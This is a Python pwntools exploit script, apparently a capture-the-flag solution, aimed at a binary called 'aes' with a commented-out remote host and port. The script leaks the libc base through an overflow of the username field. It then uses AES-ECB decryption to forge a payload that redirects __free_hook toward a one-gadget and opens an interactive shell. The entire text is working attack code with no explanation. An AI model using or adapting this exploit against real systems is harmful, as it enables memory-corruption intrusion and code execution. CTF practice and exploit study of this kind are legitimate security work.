from pwn import *

elf = ELF("./aes")
libc = elf.libc

target = elf.process()
#target = remote("65.108.188.88", 51010)

def sa(s, d):
	target.sendafter(s, str(d))
def sla(s, d):
	sa(s, str(d) + "\n")

def user_name(s):
	sla("> ", 1)
	sa(":", s)

def encrypt():
	sla("> ", 2)

def view():
	sla("> ", 3)

def leak():
	b = 3
	for i in range(0x10):
		user_name('A'*0x40 + '\x30' + chr(b))
		view()
		target.recvuntil(b"Secret = ")
		leak = target.recvuntil(b">")
		if b'\x00'*8 in leak and b'\xc0' in leak:
			libc.address = u64(leak[8:16]) + 0x7ff5489d6000 - 0x7ff548bc25c0
			log.info("LIBC Base: " + hex(libc.address))
			break
		b = b + 0x10
	if (i == 0x10):
		print("Not found")
		target.close()
		exit()

sa(":", "A"*0x10)
sa(":", "A"*0x10)

leak()

from Crypto.Cipher import AES

aes = AES.new("A"*0x10, AES.MODE_ECB)
interm = aes.decrypt(p64(libc.address + 0xe6c7e)*2)
s = interm[:8] + b'A'*8
iv = xor(interm, s)

#gdb.attach(target, 'b strlen')
payload = s
payload += b'A'*0x20
payload += iv
payload += p64(libc.sym['__free_hook'] - 8)[:6]
user_name(payload)

encrypt()

target.interactive()